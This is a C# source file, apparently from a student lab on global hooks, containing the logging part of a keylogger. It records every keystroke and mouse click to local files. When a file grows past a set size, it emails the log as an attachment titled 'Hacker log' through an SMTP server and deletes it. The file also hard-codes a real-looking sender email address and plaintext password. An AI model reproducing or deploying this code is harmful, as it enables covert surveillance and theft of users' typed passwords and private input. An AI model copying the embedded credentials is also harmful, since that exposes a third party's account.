using System;
using System.IO;
using System.Net.Mail;
using System.Text.RegularExpressions;

namespace Lan8._1_GlobalHooks
{
    internal class Logger
    {
        private readonly ConfigFile _configuration;
        private const string KeyboardLogFilePath = @"keyboard.log";
        private const string MouseLogFilePath = @"mouse.log";
        
        private const string From = "lizok-1997@inbox.ru";
        private const string Password = "27111997Liza";
        private const string Host = "smtp.mail.ru";
        private const int Port = 465;

        public Logger(ConfigFile configuration)
        {
            _configuration = configuration;
        }

        public void LogMouse(string keyName, string position)
        {
            using (var streamWriter = new StreamWriter(MouseLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}] Position[{position}]");
            }
            CheckLogFileSize(MouseLogFilePath);
        }

        public void LogKeyboard(string keyName)
        {
            using (var streamWriter = new StreamWriter(KeyboardLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}]");
            }
            CheckLogFileSize(KeyboardLogFilePath);
        }

        private void CheckLogFileSize(string filePath)
        {
            if (new FileInfo(filePath).Length <= _configuration.FileSize) return;
            if (string.IsNullOrEmpty(_configuration.Email)) return;
            SendEmail(_configuration.Email, @"Hacker log", filePath);
            new FileInfo(filePath).Delete();
        }
        
        public void SendEmail(string to, string subject, string filePath)
        {
            var smtpClient = new SmtpClient(Host, Port)
            {
                Credentials = new System.Net.NetworkCredential(From, Password),
                EnableSsl = true
            };
            var newTo = ConvertToHost(to);
            var mail = new MailMessage(From, newTo, subject, string.Empty);
            using (var attachment = new Attachment(filePath))
            {
                mail.Attachments.Add(attachment);
                smtpClient.Send(mail);
            }
        }

        private string ConvertToHost(string to)
        {
            var begin = new Regex(@"^(.+)@").Match(to);
            var good = begin.Value + Host;
            return good;
        }
    }
}
